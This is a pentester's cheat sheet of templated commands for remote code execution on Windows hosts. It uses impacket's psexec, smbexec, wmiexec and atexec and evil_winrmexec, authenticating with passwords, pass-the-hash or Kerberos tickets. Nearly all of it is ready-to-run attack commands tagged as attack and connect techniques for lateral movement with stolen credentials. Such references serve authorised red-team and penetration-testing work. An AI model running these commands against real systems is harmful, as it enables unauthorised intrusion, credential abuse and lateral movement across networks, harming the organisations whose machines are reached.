# impacket

% impacket, windows, exec

## PSEXEC with username
#plateform/linux #target/remote #port/445 #protocol/smb #cat/ATTACK/CONNECT  
create a new service (using \pipe\svcctl via SMB)
```
impacket-psexec <domain>/'<user>':'<password>'@<ip>
```

## PSEXEC with pass the Hash (pth)
#plateform/linux #target/remote #port/445 #protocol/smb #cat/ATTACK/CONNECT  
create a new service (using \pipe\svcctl via SMB)
```
impacket-psexec -hashes <hash> '<user>'@<ip>
```

## PSEXEC with kerberos
#plateform/linux #target/remote #port/445 #protocol/smb #cat/ATTACK/CONNECT  
create a new service (using \pipe\svcctl via SMB)
```
export KRB5CCNAME=<ccache_file>; impacket-psexec -dc-ip <dc_ip> -target-ip <ip> -no-pass -k <domain>/'<user>'@<target_name>
```

## SMBEXEC with username
#plateform/linux #target/remote #port/445 #protocol/smb #cat/ATTACK/CONNECT  
create a new service 'BTOBTO' (using temp bat files via SMB)
```
impacket-smbexec <domain>/'<user>':'<password>'@<ip>
```

## SMBEXEC with pass the Hash (pth)
#plateform/linux #target/remote #port/445 #protocol/smb #cat/ATTACK/CONNECT  
create a new service 'BTOBTO' (using temp bat files via SMB)
```
impacket-smbexec -hashes <hash> '<user>'@<ip>
```

## SMBEXEC with kerberos
#plateform/linux #target/remote #port/445 #protocol/smb #cat/ATTACK/CONNECT  
create a new service 'BTOBTO' (using temp bat files via SMB)
```
export KRB5CCNAME=<ccache_file>; impacket-smbexec -dc-ip <dc_ip> -target-ip <ip> -no-pass -k <domain>/'<user>'@<target_name>
```

## wmiexec
#plateform/linux #target/remote #port/135 #protocol/wmi #cat/ATTACK/CONNECT  
Execute a command shell without touching the disk or running a new service using DCOM
```
impacket-wmiexec <domain>/'<user>':'<password>'@<ip>
```

## wmiexec  with pass the hash (pth) 
#plateform/linux #target/remote #port/135 #protocol/wmi #cat/ATTACK/CONNECT  

Execute a command shell without touching the disk or running a new service using DCOM
```
impacket-wmiexec -hashes <hash> '<user>'@<ip>
```

## atexec - execute command view the task scheduler 
#plateform/linux #target/remote #port/445 #protocol/smb #cat/ATTACK/CONNECT  
Using \pipe\atsvc via SMB
```
impacket-atexec <domain>/'<user>':'<password>'@<ip> "command"
```

## atexec pass the hash (pth)
#plateform/linux #target/remote #port/445 #protocol/smb #cat/ATTACK/CONNECT  
Execute command view the task scheduler (using \pipe\atsvc via SMB)
```
impacket-atexec -hashes <hash> '<user>'@<ip> "command"
```

# impacket-wmiexec

## impacket-wmiexec - login with creds
```
impacket-wmiexec '<DOMAIN>/<USERNAME>:<PASSWORD>@<DC>'
```

## impacket-wmiexec - login with hash
```
impacket-wmiexec -hashes '<HASH>' '<USERNAME>@<DC>'
```


# evil_winrmexec

## evil_winrmexec - login with creds
```
evil_winrmexec.py <DOMAIN>@<USERNAME>:'<PASSWORD>'@<DC>
```

## evil_winrmexec - login with creds
```
evil_winrmexec.py <DOMAIN>@<USERNAME>:'<PASSWORD>'@<DC>
```

## evil_winrmexec - login with Kerberos
```
evil_winrmexec.py <DOMAIN>@'<USERNAME>' -k -no-pass
```